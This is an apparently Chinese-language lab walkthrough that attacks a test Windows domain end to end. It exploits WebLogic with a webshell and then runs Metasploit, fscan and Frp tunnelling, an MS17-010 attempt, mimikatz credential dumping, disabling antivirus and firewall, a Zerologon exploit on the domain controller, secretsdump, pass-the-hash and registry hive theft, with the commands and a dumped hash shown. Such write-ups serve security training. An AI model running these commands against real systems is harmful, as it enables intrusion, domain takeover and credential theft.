三、外围打点

1、探测内网存活主机。

netdiscover -i eth0 -r 192.168.111.0/24

得到靶机的IP为192.168.111.80.

2、使用Goby对IP进行扫描。

Goby扫描到了7001端口，并且扫描到了WebLogic漏洞，我们用工具验证一下。

显示存在漏洞，我们上传冰蝎马进行连接。

四、将冰蝎shell传递给MSF

1、MSF进行如下配置。

2、冰蝎配置如下，点击连接。

4、MSF成功接收到会话。

5、我们getuid查看权限，发现权限很低，我们使用getsystem进行提权，发现提权失败。

6、我们上传fascan进行扫描。

upload /root/fscan64.exe C:/fscan64.exe

7、接下来我们进入shell，来到C盘，看看上传是否成功。

8、我们对整个IP段进行扫描， 将结果重定向到1.txt文件中。

fscan64.exe -h 192.168.111.0/24 > 1.txt

将1.txt文件下载到本地进行查看分析。

download 1.txt /root

9、除了扫描到了Weblogic漏洞之外，我们还看见了192.168.111.80机器上存在MS17-010漏洞。

五、永恒之蓝攻击

1、添加路由。

2、设置socks5代理。

3、MSF模块全局代理。

setg proxies socks5:127.0.0.1:1080setg ReverseAllowProxy true

攻击失败，猜测应该是防火墙开启的原因。

六、Frp将本地流量代理出来

1、我们首先将Frp上传到目标服务器。

2、首先配置本地Frps.ini。

3、接着配置我们上传的Frpc.ini，配置如下。

edit frpc.ini

4、服务端

./frps -c frps.ini

5、客户端

frpc.exe -c frpc.ini

可以看到流量代理正常，我们用靶机本机的流量来打MS17-010。

6、首先我们使用全局代理模块。

setg proxies socks5:127.0.0.1:7777

setg ReverseAllowProxy true

set ReverseAllowProxy true

set rhosts 10.10.10.80

成功拿到SYSTEM权限。

7、我们接下来利用mimikatz来抓取密码。

load kiwi
creds_all

mssql     DE1AY   1qaz@WSX

七、利用代理远程登陆

1、首先我们拿到了管理员的账号密码。我们配置代理，远程到10.10.10.80。

proxychains4 rdesktop 10.10.10.80

2、管理员登陆，首先我们关闭杀软，然后在关闭防火墙。

八、CVE-2020-1472NetLogon 特权提升漏洞

1、我们首先确定域控IP和域控主机名。

net time /domain
ping 10.10.10.10

我们知道了域控的IP是10.10.10.10。

2、接着我们要获取它的域控制器。

net group "domain controllers" /domain

它的域控制器就是DC。

3、接着我们首先判断CVE-2020-1472这个漏洞存不存在。

检测脚本下载：https://github.com/SecuraBV/CVE-2020-1472

proxychains4 python3 zerologon_tester.py dc 10.10.10.10

成功！Zerologon 攻击可以完全破坏 DC。

4、接下来，我们利用exp进行攻击，将域控密码重置。

脚本下载链接：https://github.com/dirkjanm/CVE-2020-1472

proxychains4 python3 cve-2020-1472-exploit.py dc 10.10.10.10

密码置空成功。

5、-no-pass dump域控hash

proxychains4 secretsdump.py de1ay.com/dc\$@10.10.10.10 -no-pass

我们将本地的管理员密码，复制下来。

Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::

6、我们重置密码之后，我们还要将密码恢复。

proxychains4 impacket-wmiexec  -hashes  aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24   ./administrator@10.10.10.10

我们输入hostname。

7、我们接着把它数据库里面存储的密码dump下来，拿到本地进行解密，解密之后，我们再用相应的脚本进行恢复密码。

保存注册表
reg save HKLM\SYSTEM system.save

reg save HKLM\SAM sam.save

reg save HKLM\SECURITY security.save

8、将文件下载下来。

lget sam.save
lget security.save
lget system.save

然后删除文件。

del *.save

9、这时候。我们顺便改一下域控管理员的密码。

net user administrator Admin12345 /domain

修改好了之后，我们退出。

10、在本地，我们就看到了这三个我们下载下来的文件。

11、接着我们进行密码提取。

这里kali自带的impacket问题很多，我们自行下载。

cd impacket/
python3 -m pip install .  
python3 setup.py install
